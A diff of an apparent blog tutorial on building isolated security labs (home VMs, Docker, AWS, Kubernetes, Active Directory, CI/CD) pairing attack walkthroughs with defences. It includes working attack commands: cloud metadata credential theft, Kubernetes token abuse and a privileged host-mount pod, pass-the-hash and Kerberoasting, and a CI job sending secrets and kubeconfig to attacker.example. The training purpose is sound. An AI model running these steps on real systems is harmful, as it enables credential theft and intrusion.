@@ -14,170 +14,139 @@ If you want to get good at hacking (and defending), you need somewhere you can b
 
 Before anything else:
 
-- Only attack systems you:
-  - Own or control, or
-  - Have explicit permission to test (e.g. TryHackMe, HackTheBox, bug‑bounty scopes).
-- Isolate your lab:
-  - Separate VLAN/Wi‑Fi or internal‑only cloud VPC/VNet.
-  - No internet‑exposed vulnerable boxes unless you know exactly what you’re doing with firewalls and ACLs.
-- Make it resettable:
-  - Snapshots for VMs.
-  - Images for containers.
-  - IaC (Terraform, manifests) for cloud.
+- **Only attack systems you own or have explicit permission to test.** TryHackMe, HackTheBox, PortSwigger Academy, OffSec proving grounds, and bug-bounty programs (within scope) are the only legal "external" targets. Everything else is a felony in most jurisdictions, regardless of how educational your intent was.
+- **Isolate your lab.** Separate VLAN/Wi‑Fi or internal-only cloud VPC. No internet-exposed vulnerable boxes unless you have a specific reason and the firewalling to back it up.
+- **Make it resettable.** VM snapshots, container images, IaC (Terraform, manifests). When something goes wrong (and it will), you should be 60 seconds from a clean slate.
 
-With that out of the way, let’s build some labs.
+Companion reading: this lab is where you practise the things in [How To Write a CTF Writeup That's Actually Worth Reading](https://geekyblinder.co.uk/#/2026/02/01/How-To-Write-a-CTF-Writeup), [Auth, OAuth, and JWTs: How They Work and How Attackers Break Them](https://geekyblinder.co.uk/#/2026/06/07/Auth-OAuth-and-JWTs-How-They-Work-and-How-Attackers-Break-Th), and [Modern Web Hacking in 2026: Beyond Just Run SQLMap](https://geekyblinder.co.uk/#/2027/03/14/Modern-Web-Hacking-in-2026-Beyond-Just-Run-SQLMap).
 
 ---
 
 ## Option 1: Home Lab with Laptops and Old PCs
 
-This is the classic starting point.
+The classic starting point.
 
-### 1.1 Basic Topology
+### 1.1 Topology
 
-- **Attacker box**:
-  - Laptop/PC running Kali, Parrot, or your favourite Linux with tools.
-- **Victim boxes** (VMs or separate machines):
-  - Vulnerable Linux and Windows VMs (DVWA, Juice Shop, Metasploitable, VulnHub images).
-
-Connect them via:
-
-- An isolated router/switch, or
-- VirtualBox/VMware/Hyper‑V internal network (no external interface).
+- **Attacker box.** Laptop or PC running Kali, Parrot, or your own Linux build with security tools.
+- **Victim VMs.** Vulnerable Linux/Windows running DVWA, Juice Shop, Metasploitable 3, VulnHub images.
+- **Network.** A virtual internal network (VirtualBox / VMware / Hyper‑V "internal" mode), or a separate physical switch with no uplink to your real LAN.
 
 ### 1.2 Tools on the Attacker Box
 
-Install:
+```bash
+# minimum useful baseline (Kali / Debian / Ubuntu)
+sudo apt install -y \
+  nmap masscan \
+  ffuf gobuster dirb \
+  sqlmap \
+  hydra \
+  john hashcat \
+  metasploit-framework \
+  burpsuite \
+  python3-pip
+pip3 install pwntools impacket
+```
 
-- Recon/scanning:
-  - `nmap`, `masscan`
-- Web:
-  - Burp Suite / OWASP ZAP
-  - `ffuf`, `dirsearch`
-- Exploitation helpers:
-  - `sqlmap` for SQLi testing (only on your lab)
-  - `metasploit-framework`
-- Scripting:
-  - Python, `requests`, `pwntools` if you fancy.
+For Windows-side practice, also grab [BloodHound](https://github.com/SpecterOps/BloodHound), [Rubeus](https://github.com/GhostPack/Rubeus), and the [Impacket suite](https://github.com/fortra/impacket).
 
-### 1.3 Scenario: Web App Recon → Exploit → Post‑Ex
+### 1.3 Scenario: Web App Recon → Exploit → Post-Ex
 
 **Build it:**
 
-- Spin up a Linux VM.
-- Install a LAMP stack and DVWA (or just use a ready‑made DVWA VM).
-- Put it on the internal network, reachable from Kali but not the internet.
+- Spin up an Ubuntu VM with DVWA (or use the prebuilt [Metasploitable 2/3](https://github.com/rapid7/metasploitable3) image).
+- Put it on the internal network only.
 
-**High‑level walkthrough:**
+**Walkthrough:**
 
-1. **Recon**:
-   - `nmap -sV <dvwa_ip>` to find open ports and versions.
-   - Visit the app in your browser, map out login, upload, command exec, and SQL injection pages.
+1. **Recon.** `nmap -sV -sC -p- <target>` to find services and versions. Visit the app, map login/upload/SQLi/command-exec endpoints.
+2. **Attack-surface mapping.** Burp Suite or ZAP to crawl. Catalogue parameters (IDs, search, forms).
+3. **Exploit.** Pick the SQLi module. Manual injection first (single-quote test, UNION SELECT) — *then* sqlmap to confirm. Extract DB schema, user table, password hashes. Crack a hash with `hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt`.
+4. **Post-ex.** From command-exec or file upload → reverse shell to your Kali. Enumerate: `whoami`, OS, network, sudoers (`-l`), SUID binaries (`find / -perm -4000 2>/dev/null`), config files with creds. Try a privesc — kernel exploit, sudo misconfig, writable cron.
+5. **Defence thinking.** What logs would have caught this? Auth log, web access log, WAF? Which control breaks the chain — input validation, parameterised queries, least-privileged DB user, egress filtering?
 
-2. **Attack surface mapping**:
-   - Use Burp/ZAP to map endpoints.
-   - Note parameters: IDs, search boxes, forms.
-
-3. **Exploit (example: SQL injection module)**:
-   - Identify a parameter that’s vulnerable (e.g. `id`).
-   - Use manual testing or a tool like `sqlmap` (within your lab) to extract:
-     - DB name.
-     - User table and password hashes.
-   - Try other DVWA modules: command injection, file upload, XSS.
-
-4. **Post‑exploitation**:
-   - If command exec/file upload gives you a shell:
-     - Enumerate system: `whoami`, OS, network.
-     - Look for misconfig (world‑writable files, SUID binaries, passwords in configs).
-     - Practise priv‑esc using local misconfig or known kernel vulns (still within the lab VM).
-
-5. **Defence thinking**:
-   - What logs are generated?
-   - How would you detect this in a real environment?
-   - Which controls (WAF, input validation, least privilege) would break this chain?
+The defence-thinking step is the difference between "I solved a CTF" and "I understand the attack chain in production".
 
 ---
 
-## Option 2: Cloud Lab – AWS, GCP, Azure
+## Option 2: Cloud Lab — AWS, GCP, Azure
 
-Now we take it to the cloud, where modern attacks actually live.
+Modern attacks live in the cloud. Practise there.
 
 ### 2.1 Core Pattern
 
-For any cloud:
-
-- Create a dedicated **project/account/subscription** for the lab.
-- Build a **VPC/VNet** with:
-  - Public subnet:
-    - Bastion / attacker instance (Kali or hardened Linux).
-  - Private subnet:
-    - Vulnerable app servers.
-- Security groups / NSGs:
-  - Allow inbound SSH/RDP only from your IP.
-  - Only allow the bastion to reach victims on required ports.
+- Dedicated **lab account/project/subscription**, never your personal admin account.
+- VPC with public subnet (bastion / Kali) and private subnet (vulnerable apps).
+- Security groups / NSGs default-deny; allow inbound only from your IP, only to the bastion.
+- Budget alarm at $20/month — easy to forget a `t3.large` running.
 
 ### 2.2 AWS Example: Web App + Cloud Misconfig
 
-**Build it:**
+**Build it (Terraform sketch):**
 
-- VPC with:
-  - `kali-ec2` in public subnet.
-  - `web-vuln` (EC2 with Juice Shop or DVWA) in private subnet.
-- IAM:
-  - Attach an over‑permissive role to `web-vuln` (e.g. can list/read from certain S3 buckets).
-- S3:
-  - Create a bucket with mock “sensitive” data (e.g. fake customer records).
+```hcl
+resource "aws_iam_role" "vuln_app_role" {
+  name = "vuln-app-role"
+  assume_role_policy = jsonencode({
+    Version = "2012-10-17"
+    Statement = [{
+      Effect = "Allow"
+      Principal = { Service = "ec2.amazonaws.com" }
+      Action = "sts:AssumeRole"
+    }]
+  })
+}
 
-**High‑level walkthrough:**
+# Deliberately over-permissive — for the lab
+resource "aws_iam_role_policy_attachment" "lab_overprivileged" {
+  role       = aws_iam_role.vuln_app_role.name
+  policy_arn = "arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"
+}
 
-1. From `kali-ec2`:
-   - Scan `web-vuln` (internal IP) with `nmap`.
-   - Discover the web app, map it, and find a vuln (e.g. RCE or SSRF).
+resource "aws_s3_bucket" "fake_sensitive" {
+  bucket = "lab-sensitive-data-${random_id.suffix.hex}"
+}
+```
 
-2. Once you have code execution on `web-vuln`:
-   - Enumerate instance metadata:
-     - `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` (lab only).
-   - Extract temporary IAM creds for the instance role.
+**Walkthrough:**
 
-3. Use stolen creds:
-   - Configure AWS CLI with them.
-   - `aws s3 ls`, `aws s3 cp s3://sensitive-bucket/... .` to exfil fake data.
+1. From `kali-ec2`, scan the private app: `nmap -sV <internal-ip>`. Find the web vuln (RCE / SSRF / file upload).
+2. Once you have code execution on `web-vuln`, hit instance metadata. **Use IMDSv2 in your lab to learn the modern technique:**
+   ```bash
+   TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+   curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+     http://169.254.169.254/latest/meta-data/iam/security-credentials/vuln-app-role
+   ```
+3. Configure the AWS CLI with the temporary creds. `aws s3 ls` and `aws s3 cp s3://lab-sensitive-data-XXX/secret.txt .` to exfil the fake data.
+4. **Defence angle.**
+   - Lock IAM to least privilege.
+   - Force IMDSv2-only on the instance.
+   - Block egress at the network level so the app can't talk to arbitrary endpoints.
+   - Detect: CloudTrail `AssumeRole` / `GetObject` from unusual sources, GuardDuty findings.
 
-4. Defence angle:
-   - How to lock down:
-     - IAM (least privilege).
-     - Metadata access (IMDSv2, SSRF protections).
-     - Egress and network controls (so app servers can’t talk to random endpoints).
-
-Repeat similar patterns in GCP (service accounts + Cloud Storage) and Azure (managed identities + Blob Storage).
+Repeat the pattern in GCP (service accounts + Cloud Storage) and Azure (managed identities + Blob Storage). The shape — exploit app → grab workload identity → use cloud APIs — is the same.
 
 ---
 
-## Option 3: Docker‑Only Lab on a Single Machine
+## Option 3: Docker-Only Lab on a Single Machine
 
-Perfect when you don’t want to juggle multiple VMs.
+Perfect when you don't want to juggle VMs.
 
-### 3.1 Core Idea
-
-Use `docker-compose` to spin up:
-
-- Attacker container (`kalilinux/kali-rolling` or plain Ubuntu with tools).
-- Several vulnerable apps.
-- Optional logging stack (ELK, Wazuh) to view attacks from the defender side.
-
-All on an isolated Docker bridge network.
-
-### 3.2 Example Layout
-
-Conceptually:
+### 3.1 Layout
 
 ```yaml
+# docker-compose.yml
 version: "3.8"
+
 services:
   attacker:
     image: kalilinux/kali-rolling
     tty: true
+    stdin_open: true
     networks: [labnet]
+    volumes:
+      - ./loot:/loot
 
   dvwa:
     image: vulnerables/web-dvwa
@@ -186,701 +155,316 @@ services:
   juice:
     image: bkimminich/juice-shop
     networks: [labnet]
+    ports: ["3000:3000"]   # only if you want browser access from host
+
+  internal-api:
+    image: vulnerable/secret-api:latest   # or your own
+    networks: [labnet]
+    expose: ["8080"]      # not bound to host — only reachable from labnet
 
 networks:
   labnet:
     driver: bridge
+    internal: true        # no internet access from this network
 ```
 
-You:
+```bash
+docker compose up -d
+docker compose exec attacker bash
+# inside attacker container, install missing tools
+apt update && apt install -y nmap ffuf hydra
+```
+
+### 3.2 Scenario: Multi-Target Recon and Pivot
+
+1. **Discover.** `nmap -sn 172.18.0.0/16` (or whatever the labnet subnet is) → get IPs of all running containers.
+2. **Service ID.** `nmap -sV -p- <ip>` against each. Identify which is DVWA, which is Juice Shop, which is the internal-only API.
+3. **Initial foothold.** Exploit Juice Shop's auth bypass or DVWA's command-exec module. Get a foothold as the container's running user.
+4. **Pivot.** From the compromised container, can you reach `internal-api` (which is `internal: true` so isn't published to your host)? If yes, you've demonstrated the same pattern as cloud-internal pivot — exploit external-facing app, use it to reach internal services.
+5. **Defender view.** If you've spun up an ELK/Wazuh side-stack on the same host (separate compose), look at the access logs while you attack. Note signatures you could detect on.
+
+---
+
+## Option 4: Kubernetes Lab — Attacking the Cluster Mindset
+
+Most modern infra is K8s or smells like K8s. Practise there.
+
+### 4.1 Base Setup
+
+Local options:
+
+- [`kind`](https://kind.sigs.k8s.io/) — Kubernetes-in-Docker. Lightest. `kind create cluster --name lab`.
+- [`k3d`](https://k3d.io/) — k3s in Docker. Slightly fuller-featured.
+- `minikube` — heavier but battery-included.
+
+Cloud option: managed K8s (GKE Autopilot, EKS, AKS) in a lab-only project. Cleaner but ~$70/mo running 24/7.
+
+Namespace shape:
+
+- `attacker` — pod with toolset.
+- `vuln-apps` — deliberately vulnerable services.
+- `monitoring` — Falco / Sysdig / a Loki+Promtail stack for the defender view.
+
+### 4.2 Scenario: App → Pod → K8s API Abuse
+
+**Build it:**
+
+```yaml
+# vuln-rbac.yaml — deliberately over-permissive ServiceAccount
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: vuln-sa
+  namespace: vuln-apps
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: vuln-sa-edit
+  namespace: vuln-apps
+subjects:
+  - kind: ServiceAccount
+    name: vuln-sa
+    namespace: vuln-apps
+roleRef:
+  kind: ClusterRole
+  name: edit                    # way more than the app needs
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: vuln-web
+  namespace: vuln-apps
+spec:
+  replicas: 1
+  selector:
+    matchLabels: { app: vuln-web }
+  template:
+    metadata:
+      labels: { app: vuln-web }
+    spec:
+      serviceAccountName: vuln-sa
+      automountServiceAccountToken: true   # default, but explicit here
+      containers:
+        - name: app
+          image: vulnerables/web-dvwa
+          ports: [{ containerPort: 80 }]
+```
+
+No NetworkPolicy means full intra-cluster access by default.
+
+**Walkthrough:**
+
+1. **External.** Port-forward the vulnerable web app: `kubectl port-forward -n vuln-apps deploy/vuln-web 8080:80`. Map and exploit a vuln to get RCE in the pod.
+2. **Inside the pod.** List env, files, and especially:
+   ```bash
+   ls /var/run/secrets/kubernetes.io/serviceaccount/
+   cat /var/run/secrets/kubernetes.io/serviceaccount/token
+   cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+   ```
+3. **Talk to the API.** Either install `kubectl` quickly, or use `curl` directly:
+   ```bash
+   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+   curl -k -H "Authorization: Bearer $TOKEN" \
+     https://kubernetes.default.svc/api/v1/namespaces/vuln-apps/secrets
+   ```
+4. **Abuse RBAC.** With `edit` rights on the namespace, create a privileged pod that mounts the host filesystem:
+   ```yaml
+   apiVersion: v1
+   kind: Pod
+   metadata: { name: pwn, namespace: vuln-apps }
+   spec:
+     containers:
+       - name: pwn
+         image: alpine
+         command: ["sleep", "3600"]
+         securityContext: { privileged: true }
+         volumeMounts: [{ name: host, mountPath: /host }]
+     volumes: [{ name: host, hostPath: { path: / } }]
+   ```
+   `kubectl apply -f pwn.yaml` then `kubectl exec -it pwn -- chroot /host bash`. You're now running on the node.
+5. **Defence.**
+   - Default-deny NetworkPolicy + only-what's-needed allows.
+   - ServiceAccount RBAC scoped to specific verbs/resources.
+   - `automountServiceAccountToken: false` unless explicitly needed.
+   - Pod Security Standards (`restricted` baseline) blocks privileged pods at admission.
+   - Kyverno / OPA Gatekeeper for custom policy.
+
+For the deeper version of locking this down, see [Deep Walkthrough: Hardening a Kubernetes Namespace for a Real Service](https://geekyblinder.co.uk/#/2026/09/27/Deep-Walkthrough-Hardening-a-Kubernetes-Namespace-for-a-Real).
+
+---
+
+## Option 5: Cloud + Containers Combined
+
+Bring the cloud and K8s patterns together.
+
+**Setup:** managed K8s cluster, vulnerable app that has access to cloud storage via mounted credentials or workload identity (IRSA on EKS, Workload Identity on GKE, AAD Workload Identity on AKS).
 
-docker exec -it attacker bash
+**Scenario: data exfiltration cloud-native**
 
-Work entirely inside the labnet network.
+1. Exploit app-layer flaws — IDOR or broken access control to read other users' API objects.
+2. Get RCE in the pod.
+3. Use the pod's workload identity to talk to cloud storage directly:
+   ```bash
+   # GKE Workload Identity example
+   gcloud auth application-default print-access-token
+   gsutil ls gs://customer-data-bucket/
+   ```
+4. Exfil dummy data; observe what shows up in cloud audit logs (CloudTrail / Cloud Audit Logs / Activity Log).
+5. **Hardening.** App-level authz on every endpoint. IAM scoped to specific bucket prefixes. Egress restricted via VPC SC / private endpoint. DLP alerts on bulk reads.
+
+---
+
+## Bonus Scenario 1: Internal Windows Lab and Lateral Movement
+
+Classic AD attack practice — get a foothold, move sideways, pop the domain — in a lab you control.
+
+**Build it:**
+
+- One Windows Server VM as DC (AD DS), with a couple of test domain users and groups.
+- One or two Windows 10/11 client VMs joined to the domain, different users logged in.
+- One Kali/Parrot attacker VM on the same isolated network.
+- Tools: Impacket suite, BloodHound, Rubeus, CrackMapExec.
+
+**Walkthrough:**
+
+1. **Recon.** `nmap -sV --script smb-os-discovery,smb-enum-shares <target>`. Enumerate SMB, RPC, WinRM. `crackmapexec smb <target_range>` to fingerprint hosts.
+2. **Initial foothold (lab only).** Plant local user creds on a workstation, or enable an easy weakness (weak local password, RDP open from attacker subnet). Don't simulate phishing on real people.
+3. **BloodHound mapping.** From the foothold:
+   ```bash
+   sharphound.exe -c All
+   # transfer the output to attacker, ingest into BloodHound
+   ```
+   Visualise paths. The "Shortest Path to Domain Admins" query is the gateway drug.
+4. **Lateral movement (techniques to map, not blindly automate).**
+   - Pass-the-hash: `crackmapexec smb <target> -u user -H <ntlm-hash>`
+   - Kerberoasting: `GetUserSPNs.py domain/user:pass -dc-ip <ip> -request`
+   - AS-REP roasting (for users with `DONT_REQ_PREAUTH`).
+   - Token impersonation, DCSync (with appropriate rights).
+5. **Defence.** Least privilege for domain users, no widespread local admin, LAPS for local admin password rotation, tier-0 separation, Sysmon + Windows event logs to a SIEM, alerts on suspicious Kerberos behaviour.
+
+---
+
+## Bonus Scenario 2: Blue-Team View With Wazuh / Suricata
+
+Everything above is twice as useful if you can see your own attacks from the defender's seat.
+
+**Build it:**
+
+- Wazuh manager (or Security Onion VM).
+- Suricata sensor on the same network as your victims.
+- Filebeat / Winlogbeat / Wazuh agent on each victim VM.
+
+**Walkthrough:**
+
+1. **Wire up logging.** Send Linux auth logs and Windows Security logs to Wazuh. Send network traffic via Suricata.
+2. **Re-run attacks.** Web attacks on DVWA, port scans, failed logins, privesc.
+3. **Study the alerts.** Which Wazuh rules fire? Which Suricata signatures? What's invisible?
+4. **Tune detections.** Write a custom Wazuh rule for a pattern you saw but the defaults missed. Rules live in `/var/ossec/etc/rules/local_rules.xml`:
+   ```xml
+   <group name="webattacks,">
+     <rule id="100501" level="10">
+       <if_sid>31104,31108,31151</if_sid>
+       <regex type="pcre2">UNION\s+SELECT|sleep\(\d+\)</regex>
+       <description>Possible SQL injection attempt against web app</description>
+       <mitre><id>T1190</id></mitre>
+     </rule>
+   </group>
+   ```
+5. **Iterate.** False positives → tighten the regex. False negatives → broaden until it triggers, then narrow to acceptable noise.
 
-3.3 Scenario: Multi‑Target Recon and Pivot
-Build it:
+---
 
-Multiple web services (DVWA, Juice Shop, a vulnerable API) on the same network.
+## Bonus Scenario 3: "Micro-Bounty" Simulation in Cloud
 
-Optional additional “internal‑only” service reachable from app containers but not from the attacker directly.
+A nice intermediate step between guided labs and real bug bounties.
 
-High‑level walkthrough:
+**Build it:**
 
-From attacker:
+A small mini-SaaS in your cloud lab account: web app + API, auth, profiles, fake data, cloud DB, object storage. Plant three issues:
 
-Scan labnet range with nmap to discover services.
+- One obvious web vuln (e.g. SQLi in search).
+- One subtle auth/IDOR bug (predictable IDs + missing ownership check).
+- One cloud misconfig (over-broad IAM, public bucket inside a "private" VPC).
 
-Just by the ports/banners, identify which is which.
+**Walkthrough:**
 
-Initial exploitation:
+1. **Play external researcher.** Read your own "docs" only. Map endpoints, auth flows. Look for IDORs, broken access control, role confusion. File "reports" with proof, severity, suggested fix.
+2. **Play internal security engineer.** Triage the reports. Fix in code/IaC. Add regression tests. Document risk → impact → remediation.
+3. **Outcome.** You can truthfully say you built an app, found and fixed your own vulnerabilities, integrated security into the SDLC. Real portfolio material.
 
-Pick Juice Shop or DVWA, exploit an obvious vuln (e.g. auth bypass or injection).
+---
 
-Get access or a basic foothold.
+## Bonus Scenario 4: CI/CD Pipeline Abuse
 
-Pivot idea:
+Modern attackers love CI/CD because it's where code, secrets, and deployment power all live together.
 
-If your exploit gives you command execution in a container, enumerate what else that container can talk to.
+**Build it:**
 
-Can it reach an internal service that is not exposed externally?
+- Self-hosted Gitea or GitLab.
+- A CI runner (GitLab Runner, Jenkins, Drone).
+- A pipeline that builds container images and deploys to your K8s lab.
+- Deliberate misconfig: runner with `cluster-admin` access; secrets in plain pipeline variables; `.gitlab-ci.yml` not reviewed before execution.
 
-Use that as a stepping stone.
+**Walkthrough:**
 
-Defender view:
+1. **Normal flow.** Push, build, deploy. Confirm everything works.
+2. **Abuse perspective.** As a "malicious contributor", propose a `.gitlab-ci.yml` change that exfiltrates secrets:
+   ```yaml
+   pwn-job:
+     stage: build
+     script:
+       - env | curl --data-binary @- https://attacker.example/exfil
+       - cat ~/.kube/config | base64 | curl --data-binary @- https://attacker.example/exfil
+   ```
+3. **Observe** how easy it is to:
+   - Steal pipeline secrets.
+   - Run arbitrary code in the CI context.
+   - Reach the cluster via the runner's kubeconfig.
+4. **Hardening.**
+   - Lock runner permissions to minimum (per-job tokens, scoped service accounts).
+   - Separate runners for untrusted code (forks, MR pipelines).
+   - Move secrets to Vault / cloud secret manager, fetched per-job with short-lived tokens.
+   - Require MR review before pipelines run on protected branches.
+   - Sigstore-sign images and verify on deploy.
 
-If you added ELK/Wazuh, look at HTTP logs, container logs, or host metrics while you attack.
+---
 
-Note signatures or patterns you could alert on.
+## Cross-Cutting Patterns to Drill (Everywhere)
 
-Option 4: Kubernetes Lab – Attacking the Cluster Mindset
-Most modern infra lives in K8s or something that smells like it.
+Across all environments, design exercises around patterns rather than specific boxes. The patterns recur in every estate.
 
-4.1 Base Setup
-Local:
+- **Recon and enumeration.** Hosts, ports, services, routes, endpoints. Tech stack: frameworks, versions, headers.
+- **Web app attacks.** SQLi, XSS, IDOR, SSRF, command injection, weak auth/session handling. (See [Auth, OAuth, and JWTs](https://geekyblinder.co.uk/#/2026/06/07/Auth-OAuth-and-JWTs-How-They-Work-and-How-Attackers-Break-Th).)
+- **Infrastructure misconfig.** Over-broad IAM, exposed admin consoles, default creds, IMDSv1, public storage.
+- **Lateral movement.** Pivot via compromised host/container. Reused keys, tokens, passwords across boundaries.
+- **Privilege escalation.** Local misconfig (sudoers, SUID, writable cron). Cloud/K8s RBAC abuse.
+- **Data access and exfiltration.** Find where the crown jewels live; prove how an attacker reaches them from a foothold.
 
-kind, k3d, or minikube.
+For each scenario, write yourself a brief: entry point, objectives, rules, success criteria. That's CTF authoring with a defender's eye.
 
-Cloud:
+---
 
-Managed K8s (GKE, EKS, AKS) in a lab‑only project/account.
+## Turning Your Lab into a Career Asset
 
-Namespaces:
+Don't just build and forget. Capture it.
 
-attacker: pod with toolset (e.g. Kali/Ubuntu).
+- **Configs in Git.** Terraform, compose files, manifests. Every lab reproducible from a clone.
+- **Notes in Obsidian** (see [Obsidian as a Second Brain for Security and DevOps](https://geekyblinder.co.uk/#/2027/02/28/Obsidian-as-a-Second-Brain-for-Security-and-DevOps)). Architecture diagrams, attack paths, defences you'd add in real life.
+- **Public, redacted walkthroughs.** Focus on learning, not copy-paste exploits. Great talk material, blog material, portfolio content.
 
-vuln-apps: vulnerable services.
+When you can explain how you designed your lab, what you simulated, how you'd detect and prevent it in production, you're not "someone who did some boxes" — you're someone who understands both sides of the fence.
 
-monitoring: Falco/Sysdig/logging stack if you want defender view.
+---
 
-4.2 Scenario: App → Pod → K8s API Abuse
-Build it:
+## Where to Go Next
 
-Deploy a vulnerable web app in vuln-apps.
+- Start small. One attacker VM + one vulnerable web app, all on internal network.
+- Add containers. Add K8s. Add monitoring. Add CI/CD. Each new piece gets one attack path, one detection method, one hardening action.
+- Read [Stop Teaching Security Like It's 1999](https://geekyblinder.co.uk/#/2026/08/30/Stop-Teaching-Security-Like-Its-1999) for the meta on training and reps.
+- Pair with platforms like TryHackMe SOC Level 1, HTB Pro Labs, AppSecEngineer for guided depth — your homelab covers what they can't (your own stack, your own scenarios).
 
-Mount a service account with over‑privileged RBAC (e.g. edit on the namespace or more).
-
-No NetworkPolicies (full intra‑cluster access).
-
-High‑level walkthrough:
-
-External:
-
-Use kubectl port-forward or Ingress to access the app.
-
-Map and exploit a vuln to get RCE in the pod.
-
-Inside the pod:
-
-List environment vars, file system, and especially:
-
-Service account token (often under /var/run/secrets/kubernetes.io/serviceaccount/).
-
-Use curl or kubectl (if present) to talk to the K8s API:
-
-curl -k https://kubernetes.default.svc/api with the token.
-
-Abuse RBAC:
-
-Try listing pods or secrets in the namespace.
-
-If permitted, create a new pod with a more privileged image (e.g. mounting hostPath, or running as root).
-
-Defence thinking:
-
-Lock down service accounts (least privilege).
-
-Add NetworkPolicies to restrict pod‑to‑pod and pod‑to‑API access.
-
-Use admission controllers (OPA/Kyverno) to block dangerous specs.
-
-Option 5: Cloud + Containers Combo
-Bring it all together:
-
-Cloud account with:
-
-Managed K8s cluster.
-
-Storage.
-
-IAM.
-
-Apps:
-
-Vulnerable web/API services in K8s.
-
-Misconfigured workloads (over‑permissive IAM, wide open egress, host mounts).
-
-Scenario: Data Exfiltration in Cloud‑Native
-Build it:
-
-K8s namespace with:
-
-App that has:
-
-Access to cloud storage via mounted credentials or workload identity.
-
-Inadequate authz (IDOR, broken ACLs on user data endpoints).
-
-High‑level walkthrough:
-
-Exploit app‑layer flaws:
-
-Use IDOR or broken access control to access other users’ data via the API.
-
-Move “under” the app:
-
-Gain RCE or exploit misconfig to run your commands in the pod.
-
-Use the environment’s credentials (service account/role) to talk directly to the cloud storage (S3/Blob/Cloud Storage).
-
-Exfil:
-
-Download objects you shouldn’t have (dummy data in lab).
-
-Think about detection: logs in cloud storage, network logs, Falco rules.
-
-Hardening:
-
-App‑level authz: enforce ownership checks server‑side.
-
-IAM: restrict the pod’s role to only what it absolutely needs.
-
-Egress and DLP: limit outbound routes, alert on unusual access patterns.
-
-Bonus Scenario 1: Internal Windows Lab and Lateral Movement
-Great for understanding classic “get a foothold, move sideways, pop the domain” thinking — inside a lab you control.
-
-Build It
-One Windows Server VM:
-
-Acts as DC (AD DS).
-
-A couple of domain users/groups.
-
-One or two Windows 10/11 client VMs:
-
-Joined to the domain.
-
-Different users logged in.
-
-One attacker VM (Kali/Parrot) on the same isolated network.
-
-High‑Level Walkthrough
-Recon:
-
-Identify DC and clients with nmap.
-
-Enumerate SMB, RPC, WinRM.
-
-Initial foothold (lab only):
-
-Simulate phishing by giving yourself local user creds on a workstation or enabling an easy vuln (e.g. weak local password, RDP from attacker).
-
-Post‑ex on client:
-
-Enumerate:
-
-Logged‑in users.
-
-Mapped drives.
-
-Stored creds (lab: Credential Manager, saved RDP sessions).
-
-Understand where the DC is and what rights your compromised user has.
-
-Lateral movement & escalation (conceptually):
-
-Try to access other machines with the same user.
-
-Observe domain policy (local admin rights, GPO).
-
-Map where classic techniques (pass‑the‑hash, Kerberoasting) would fit, even if you don’t fully automate them yet.
-
-Defence thinking:
-
-Least privilege for domain users.
-
-Restrict local admin rights.
-
-Harden DCs and monitoring (Windows event logs, Sysmon, SIEM).
-
-Bonus Scenario 2: Blue‑Team View With Wazuh / Suricata
-Everything above is twice as useful if you can see your own attacks from the defender’s perspective.
-
-Build It
-Wazuh manager or Security Onion VM (or similar).
-
-Suricata sensor on the same network as your victims.
-
-Filebeat/Winlogbeat/agents on your victim VMs.
-
-High‑Level Walkthrough
-Wire up logging:
-
-Send host logs (Linux auth logs, Windows Security) to Wazuh/SIEM.
-
-Send network traffic via Suricata.
-
-Re‑run attacks from previous scenarios:
-
-Web attacks on DVWA/Juice Shop.
-
-Port scans.
-
-Failed logins, successful logins, privilege escalations.
-
-Study the alerts:
-
-Which rules light up?
-
-What is not detected?
-
-How noisy are your scans vs stealthier approaches?
-
-Tune detections:
-
-Write a basic rule to catch something you know you’re doing (e.g. repeated 401s followed by success on a sensitive endpoint).
-
-Refine to reduce false positives.
-
-Bonus Scenario 3: “Micro‑Bounty” Simulation in Cloud
-A nice intermediate step between labs and real bug bounties.
-
-Build It
-Cloud account with a small “mini‑SaaS”:
-
-Simple web app + API.
-
-Auth, profiles, some fake data.
-
-Back it with:
-
-Cloud DB.
-
-Object storage.
-
-A few deliberate issues:
-
-One obvious web vuln.
-
-One subtle auth/IDOR bug.
-
-One cloud misconfig (over‑broad IAM, open bucket in a private VPC).
-
-High‑Level Walkthrough
-Play the external researcher:
-
-Treat it like a real target:
-
-Read “docs” (your own notes).
-
-Map endpoints, auth flows.
-
-Look for:
-
-IDORs.
-
-Insecure direct access to objects.
-
-Poor authz between roles.
-
-Play the internal security engineer:
-
-After you’ve “reported” your own bugs:
-
-Fix them in code/IaC.
-
-Build tests to prevent regression.
-
-Document risk, impact, remediation.
-
-Outcome:
-
-You can truthfully say you:
-
-Built an app.
-
-Found and fixed your own vulnerabilities.
-
-Integrated security into the SDLC.
-
-Bonus Scenario 4: CI/CD Pipeline Abuse in Your Lab
-Modern attackers love CI/CD because it’s where code, secrets, and deployment power all live together.
-
-Build It
-Git server (Gitea/GitLab) in your lab.
-
-CI runner (GitLab Runner, Jenkins, etc.).
-
-Pipeline that:
-
-Builds images.
-
-Deploys to your K8s or Docker lab.
-
-Introduce a deliberate misconfig:
-
-Runner with overly broad permissions (e.g. can talk to cluster with cluster-admin).
-
-Secrets in plain text in pipeline variables.
-
-High‑Level Walkthrough
-Normal dev flow:
-
-Push app changes, watch the pipeline build and deploy.
-
-Abuse perspective:
-
-As a “malicious contributor” in your own lab:
-
-Propose a change in .gitlab-ci.yml / pipeline config that exfiltrates secrets or spins up a backdoored pod.
-
-Observe how easy it is to:
-
-Steal secrets.
-
-Run arbitrary code in the CI context.
-
-Reach the cluster from the runner.
-
-Hardening:
-
-Lock down runner permissions.
-
-Use separate runners for untrusted code.
-
-Remove secrets from pipelines; use vaults and short‑lived tokens.
-
-Scenario Design: What You Should Practise (Everywhere)
-Across all environments, design exercises around patterns, not just specific boxes:
-
-Recon & Enumeration
-
-Hosts, ports, services, routes, endpoints.
-
-Tech stack: frameworks, versions, headers.
-
-Web App Attacks
-
